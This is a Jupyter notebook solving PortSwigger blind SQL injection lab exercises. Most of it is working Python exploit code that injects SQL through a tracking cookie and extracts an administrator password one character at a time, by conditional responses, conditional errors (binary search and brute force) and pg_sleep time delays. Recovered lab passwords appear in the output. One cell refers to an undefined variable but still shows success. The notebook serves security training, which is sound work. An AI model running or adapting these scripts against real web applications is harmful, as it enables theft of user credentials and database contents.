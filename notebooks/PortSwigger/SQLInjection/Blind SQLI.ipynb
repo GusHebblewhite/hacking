{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "7b81c255",
   "metadata": {},
   "source": [
    "https://portswigger.net/web-security/sql-injection/blind"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "012dfd72",
   "metadata": {
    "heading_collapsed": true
   },
   "source": [
    "# Blind SQLi with conditional response\n",
    "https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "469d2dcf",
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "import requests\n",
    "import re\n",
    "import string\n",
    "from tqdm import tqdm"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "2919e272",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['<section class=\"top-links\">\\n                            <a href=/>Home</a><p>|</p>\\n                            <a href=\"/my-account\">My account</a><p>|</p>\\n                        </section>']"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "URL = \"https://acec1f3b1e2ef908c0af447500f80015.web-security-academy.net/\"\n",
    "\n",
    "#Create session to track cookies\n",
    "s = requests.Session()\n",
    "r = s.get(URL)\n",
    "\n",
    "#String that may or may not contain \"Welcome back\":\n",
    "re.findall(r\"<section class=\\\"top-links\\\">[\\s\\S]*?</section>\", r.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "44c4896b",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Repeat GET again to observe \"Welcome back\":"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "953fa4c4",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['<section class=\"top-links\">\\n                            <a href=/>Home</a><p>|</p>\\n                            <div>Welcome back!</div><p>|</p>\\n                            <a href=\"/my-account\">My account</a><p>|</p>\\n                        </section>']"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r = s.get(URL)\n",
    "re.findall(r\"<section class=\\\"top-links\\\">[\\s\\S]*?</section>\", r.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6b9a79a4",
   "metadata": {
    "hidden": true
   },
   "source": [
    "We can put this in a function for more concise syntax"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "031d4e36",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "def is_welcome_back(text):\n",
    "    if text == []:\n",
    "        print(\"Session expired\")\n",
    "        return None\n",
    "    return \"Welcome back\" in re.findall(r\"<section class=\\\"top-links\\\">[\\s\\S]*?</section>\", text)[0]\n",
    "\n",
    "is_welcome_back(r.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8550e761",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Ok now onto the lab itself. So the target data is:\n",
    "```sql\n",
    "SELECT password\n",
    "FROM users\n",
    "WHERE username = 'administrator'\n",
    "```\n",
    "\n",
    "We want to query this, and use SUBSTRING to iterate through the password letter by letter. We're given that the database is looking at the cookie, using a query like:\n",
    "\n",
    "```sql\n",
    "SELECT TrackingId \n",
    "FROM TrackedUsers \n",
    "WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4' \n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "191bacbc",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 33%|███████████████████████████▋                                                       | 12/36 [00:18<00:36,  1.51s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "c\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 81%|██████████████████████████████████████████████████████████████████▊                | 29/36 [00:43<00:10,  1.49s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  8%|███████                                                                             | 3/36 [00:05<01:01,  1.87s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 56%|██████████████████████████████████████████████                                     | 20/36 [00:32<00:26,  1.65s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  6%|████▋                                                                               | 2/36 [00:05<01:28,  2.60s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 22%|██████████████████▋                                                                 | 8/36 [00:12<00:43,  1.55s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 44%|████████████████████████████████████▉                                              | 16/36 [00:25<00:31,  1.59s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28g\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 42%|██████████████████████████████████▌                                                | 15/36 [00:22<00:30,  1.47s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gf\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 86%|███████████████████████████████████████████████████████████████████████▍           | 31/36 [00:49<00:07,  1.58s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 39%|████████████████████████████████▎                                                  | 14/36 [00:21<00:33,  1.53s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfve\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 75%|██████████████████████████████████████████████████████████████▎                    | 27/36 [00:38<00:12,  1.43s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfver\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 89%|█████████████████████████████████████████████████████████████████████████▊         | 32/36 [00:45<00:05,  1.44s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfverw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 44%|████████████████████████████████████▉                                              | 16/36 [00:23<00:29,  1.47s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfverwg\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  8%|███████                                                                             | 3/36 [00:05<01:00,  1.85s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfverwg3\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 39%|████████████████████████████████▎                                                  | 14/36 [00:23<00:37,  1.70s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfverwg3e\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 11%|█████████▎                                                                          | 4/36 [00:06<00:55,  1.73s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfverwg3e4\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 64%|█████████████████████████████████████████████████████                              | 23/36 [00:34<00:19,  1.49s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfverwg3e4n\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 81%|██████████████████████████████████████████████████████████████████▊                | 29/36 [00:43<00:10,  1.50s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfverwg3e4nt\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 72%|███████████████████████████████████████████████████████████▉                       | 26/36 [00:39<00:15,  1.51s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfverwg3e4ntq\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 11%|█████████▎                                                                          | 4/36 [00:06<00:55,  1.73s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfverwg3e4ntq4\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|███████████████████████████████████████████████████████████████████████████████████| 36/36 [00:49<00:00,  1.39s/it]\n"
     ]
    }
   ],
   "source": [
    "#Reset session\n",
    "s = requests.Session()\n",
    "r = s.get(URL)\n",
    "\n",
    "#Get cookies to modify\n",
    "cookies = s.cookies.get_dict()\n",
    "\n",
    "password = \"\"\n",
    "max_len = 32\n",
    "\n",
    "for char_idx in range(max_len):\n",
    "    found = 0\n",
    "    \n",
    "    for each_char in tqdm(string.digits + string.ascii_lowercase):\n",
    "\n",
    "        injected_query = f\"' OR SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {char_idx + 1}, 1) = '{each_char}' -- \"\n",
    "        cookies[\"TrackingId\"] = injected_query\n",
    "        r = s.get(URL, cookies=requests.cookies.cookiejar_from_dict(cookies))\n",
    "\n",
    "        if is_welcome_back(r.text):\n",
    "            #New password character found!\n",
    "            password += each_char\n",
    "            found = 1\n",
    "            print(password)\n",
    "            break\n",
    "            \n",
    "    if found == 0:\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "84b7c3df",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'ct3k28gfverwg3e4ntq4'"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "password"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "12cbd0b2",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Yay!"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9a086c42",
   "metadata": {
    "heading_collapsed": true
   },
   "source": [
    "# Blind SQLi with Conditional Errors\n",
    "https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "47d1c040",
   "metadata": {
    "hidden": true
   },
   "source": [
    "This problem is very similar to the above, so I won't write notes quite as thoroughly."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "be4fe440",
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "import requests\n",
    "import re\n",
    "import string\n",
    "from tqdm import tqdm\n",
    "import math"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "d016a7c3",
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "URL = \"https://acaf1f361f2202c1c0d30368008d009f.web-security-academy.net/\"\n",
    "\n",
    "#Set up session\n",
    "s = requests.session()\n",
    "s.get(URL)\n",
    "\n",
    "cookies = s.cookies.get_dict()\n",
    "cookie_idx = 'TrackingId'\n",
    "\n",
    "base_query = \"' OR ((SELECT CASE WHEN ({}) THEN to_char(1/0) ELSE 'a' END FROM dual) = 'a') --\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "3f4efcdf",
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "class DBChecker:\n",
    "    def __init__(self, URL, base_query, cookies, cookie_idx):\n",
    "        self.URL = URL\n",
    "        self.base_query = base_query\n",
    "        self.cookies = cookies\n",
    "        self.cookie_idx = cookie_idx\n",
    "        \n",
    "    def mod_cookie(self, content):\n",
    "        self.cookies[self.cookie_idx] = content\n",
    "\n",
    "    def check_database(self, pw_idx, relation, char_guess):\n",
    "\n",
    "        statement = \"SUBSTR((SELECT password FROM users \" + \\\n",
    "            f\"WHERE username = 'administrator'), {pw_idx}, 1) {relation} '{char_guess}'\"\n",
    "\n",
    "        query = base_query.format(statement)\n",
    "        self.mod_cookie(query)\n",
    "\n",
    "        r = requests.get(self.URL, cookies=requests.cookies.cookiejar_from_dict(self.cookies))\n",
    "\n",
    "        if r.text == 'Internal Server Error':\n",
    "            return True\n",
    "        else:\n",
    "            return False"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "0eb317d5",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "200\n",
      "500\n",
      "200\n",
      "500\n",
      "200\n",
      "500\n",
      "500\n",
      "b\n",
      "200\n",
      "500\n",
      "200\n",
      "500\n",
      "200\n",
      "500\n",
      "500\n",
      "bb\n",
      "200\n",
      "200\n",
      "200\n",
      "500\n",
      "500\n",
      "500\n",
      "500\n",
      "bbr\n",
      "200\n",
      "200\n",
      "200\n",
      "200\n",
      "500\n",
      "500\n",
      "500\n",
      "bbrv\n",
      "200\n",
      "500\n",
      "500\n",
      "200\n",
      "500\n",
      "500\n",
      "500\n",
      "bbrv4\n",
      "200\n",
      "500\n",
      "200\n",
      "200\n",
      "200\n",
      "500\n",
      "500\n",
      "bbrv4f\n",
      "200\n",
      "200\n",
      "200\n",
      "200\n",
      "200\n",
      "500\n",
      "500\n",
      "bbrv4fx\n",
      "200\n",
      "200\n",
      "500\n",
      "500\n",
      "200\n",
      "200\n",
      "500\n",
      "bbrv4fxl\n",
      "200\n",
      "500\n",
      "200\n",
      "200\n",
      "200\n",
      "200\n",
      "500\n",
      "500\n",
      "bbrv4fxlg\n",
      "200\n",
      "500\n",
      "500\n",
      "500\n",
      "200\n",
      "200\n",
      "500\n",
      "bbrv4fxlg3\n",
      "200\n",
      "500\n",
      "500\n",
      "200\n",
      "200\n",
      "500\n",
      "500\n",
      "bbrv4fxlg36\n",
      "200\n",
      "500\n",
      "500\n",
      "200\n",
      "200\n",
      "200\n",
      "500\n",
      "500\n",
      "bbrv4fxlg367\n",
      "200\n",
      "200\n",
      "200\n",
      "200\n",
      "200\n",
      "500\n",
      "500\n",
      "bbrv4fxlg367x\n",
      "200\n",
      "200\n",
      "500\n",
      "500\n",
      "500\n",
      "500\n",
      "500\n",
      "bbrv4fxlg367xi\n",
      "200\n",
      "500\n",
      "500\n",
      "200\n",
      "200\n",
      "200\n",
      "200\n",
      "500\n",
      "bbrv4fxlg367xi8\n",
      "200\n",
      "500\n",
      "200\n",
      "500\n",
      "500\n",
      "200\n",
      "500\n",
      "bbrv4fxlg367xi8a\n",
      "200\n",
      "500\n",
      "200\n",
      "200\n",
      "500\n",
      "200\n",
      "500\n",
      "bbrv4fxlg367xi8ae\n",
      "200\n",
      "200\n",
      "500\n",
      "500\n",
      "200\n",
      "200\n",
      "500\n",
      "bbrv4fxlg367xi8ael\n",
      "200\n",
      "200\n",
      "500\n",
      "200\n",
      "500\n",
      "500\n",
      "500\n",
      "bbrv4fxlg367xi8aelm\n",
      "200\n",
      "200\n",
      "200\n",
      "200\n",
      "200\n",
      "200\n",
      "200\n",
      "500\n",
      "bbrv4fxlg367xi8aelmz\n",
      "200\n",
      "200\n",
      "500\n",
      "200\n",
      "200\n",
      "500\n",
      "500\n",
      "bbrv4fxlg367xi8aelmzo\n",
      "200\n",
      "200\n",
      "200\n",
      "200\n",
      "200\n",
      "200\n",
      "200\n",
      "200\n"
     ]
    }
   ],
   "source": [
    "#Binary Search\n",
    "dbchecker = DBChecker(URL, base_query, cookies, cookie_idx)\n",
    "password = \"\"\n",
    "max_chars = 36\n",
    "end = 0\n",
    "\n",
    "#Irerate through password characters\n",
    "for pw_idx in range(1, max_chars):\n",
    "    \n",
    "    #Check if this is the end\n",
    "    if dbchecker.check_database(pw_idx, \"=\", '') == True:\n",
    "        end = 1\n",
    "        break\n",
    "    \n",
    "    #Test for password found\n",
    "    found = 0\n",
    "    \n",
    "    candidates = (string.digits + string.ascii_lowercase)\n",
    "    len_candidates = len(candidates)\n",
    "    \n",
    "    #Binary search through characters\n",
    "    for _ in range(math.ceil(math.log2(len_candidates))):\n",
    "        \n",
    "        char_idx = len(candidates)//2\n",
    "        char_guess = candidates[char_idx]\n",
    "        \n",
    "        result = dbchecker.check_database(pw_idx, \"<\", char_guess)\n",
    "        \n",
    "        if result == True:\n",
    "            candidates = candidates[:char_idx]\n",
    "        elif result == False:\n",
    "            candidates = candidates[char_idx:]\n",
    "            \n",
    "        #If we only have one left\n",
    "        if len(candidates) == 1:\n",
    "            \n",
    "            #Validate\n",
    "            if dbchecker.check_database(pw_idx, \"=\", candidates[0]) == True:\n",
    "                password += candidates[0]\n",
    "                print(password)\n",
    "                break\n",
    "                \n",
    "            else:\n",
    "                end = 1\n",
    "                break\n",
    "                \n",
    "    if end == 1:\n",
    "        break\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "37b69421",
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "#Brute Force\n",
    "\n",
    "password = \"\"\n",
    "max_chars = 36\n",
    "\n",
    "#Irerate through password characters\n",
    "for pw_idx in range(max_chars):\n",
    "    \n",
    "    found = 0\n",
    "    \n",
    "    for char_guess in (string.digits + string.ascii_lowercase):\n",
    "        \n",
    "        statement = \"SUBSTR((SELECT password FROM users \" + \\\n",
    "            f\"WHERE username = 'administrator'), {pw_idx}, 1) = '{char_guess}'\"\n",
    "\n",
    "        query = base_query.format(statement)\n",
    "        cookies[cookie_idx] = query\n",
    "\n",
    "        r = requests.get(URL, cookies=requests.cookies.cookiejar_from_dict(cookies))\n",
    "\n",
    "        if r.text == 'Internal Server Error':\n",
    "            password += char_guess\n",
    "            print(password)\n",
    "            found = 1\n",
    "            break\n",
    "            \n",
    "    if found == 0:\n",
    "        break"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "af9470ac",
   "metadata": {},
   "source": [
    "# Blind SQLi with Time Delays\n",
    "https://portswigger.net/web-security/sql-injection/blind/lab-time-delays"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "1da34aed",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import string"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "4c35ff75",
   "metadata": {},
   "outputs": [],
   "source": [
    "URL = \"https://ac171f761f7cf0f2c0d50d8f000500f6.web-security-academy.net/\"\n",
    "\n",
    "s = requests.session()\n",
    "s.get(URL)\n",
    "\n",
    "cookies = s.cookies.get_dict()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "4c706cbd",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "' UNION (SELECT CAST (pg_sleep(3) AS VARCHAR(4))) -- \n",
      "CPU times: user 17.8 ms, sys: 2.26 ms, total: 20.1 ms\n",
      "Wall time: 4.41 s\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "<Response [200]>"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#Introduce a time delay\n",
    "\n",
    "query = \"' UNION (SELECT CAST (pg_sleep(3) AS VARCHAR(4))) -- \".format(DBMSs[idx])\n",
    "cookies['TrackingId'] = query\n",
    "print(query)\n",
    "%time r = requests.get(URL, cookies=requests.cookies.cookiejar_from_dict(cookies))\n",
    "r"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
